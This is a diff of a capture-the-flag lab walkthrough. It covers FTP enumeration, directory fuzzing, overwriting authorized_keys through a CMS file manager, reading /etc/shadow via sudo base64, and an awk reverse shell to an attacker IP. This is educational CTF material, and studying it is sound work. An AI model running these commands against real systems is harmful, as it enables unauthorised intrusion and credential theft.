@@ -1,6 +1,6 @@
-Open the index site of the machine at: <ip>
+Open the index site of the machine at: http://ip
 
-We are greeted with a "Welcome to our Website" and an image of a character.
+We are greeted with a text that reads "Welcome to our Website" and an image of a character.
 
 With a reverse image search we can deduce that the character is called April.
 
@@ -25,7 +25,6 @@ Ftp command and data ports , apache and SSH.
 
 NOTE: the Ftp data port may not be visible in the scan since nmap default scan might not check if the data port is open.
 
-Question:
 
 Question:  How many ports does the machine have open?
 Answer: 4
@@ -33,8 +32,9 @@ Answer: 4
 We can then interface with the FTP server to find extra information that might be left there
 
 The ftp server can be connected to with the following command:
-ftp <ip>
-
+´´´console
+ftp ip
+´´´
 Then entering Anonymous as user
 
 then changing to passive mode with "pass" command to be able to interface with the ftp server.
@@ -46,7 +46,9 @@ A directory listing inside the ftp server shows us a directory called "public" i
 ![Interfacing with ftp](ftpls.png)
 
 We can download the diary files by typing:
+´´´console
 get <filename>
+´´´
 
 diary_06_05.txt shows the following information:
 
@@ -56,9 +58,9 @@ diary_06_05.txt shows the following information:
 there are other files with hints inside the ftp, but the relevant file is this one that reveals that the admin panel is behind a hidden path and that the admin password is "mastersplinterknowskarate"
 
 Let's find this path:
-
+´´´console
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -recursion -u http:/<IP>/FUZZ
-
+´´´
 This command first finds a directory called .listings
 then beyond that directory, it finds a directory called cmsadmin
 
@@ -90,7 +92,9 @@ Then we can head onto settings, then onto the files manager:
 We can now have multiple ways to do this but the original intention of this room was to add your own authorized keys and then ssh into the machine, lets do this:
 
 first create a key with:
+´´´console
 ssh-keygen -t rsa
+´´´
 Then add the public key from this to a file called "authorized_keys"
 and overwrite the same file on the server:
 the public key is added with:
@@ -100,9 +104,9 @@ We can then replace the original authorized_keys file on the server with this on
 ![file upload vuln](fileupload.png)
 
 After adding this we can then login with the april user as the server:
-
-ssh -i key april@<ip>
-
+´´´console
+ssh -i key april@ip
+´´´
 We arrive at the home folder of april and can read the first user flag:
 
 
@@ -126,7 +130,7 @@ https://gtfobins.github.io/gtfobins/base64/
 
 lets read files we should not have access to such as /etc/shadow and /etc/passwd:
 
-```console
+```bash
 LFILE=/etc/shadow
 sudo base64 "$LFILE" | base64 --decode
 ```
@@ -135,7 +139,7 @@ The copy the output of this manually and add it to a file called shadow.txt
 
 Then repeat for the same for /etc/passwd
 
-```console
+```bash
 LFILE=/etc/passwd
 sudo base64 "$LFILE" | base64 --decode
 ```
@@ -184,7 +188,7 @@ NOTE: not all reverse shells work for this so finding one might be trial and err
 
 A working reverse shell for this is:
 ```console
-awk 'BEGIN {s = "/inet/tcp/0/<ip>/4445"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+awk 'BEGIN {s = "/inet/tcp/0/ip/4445"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
 We then start a netcat listener on the attacker end with:
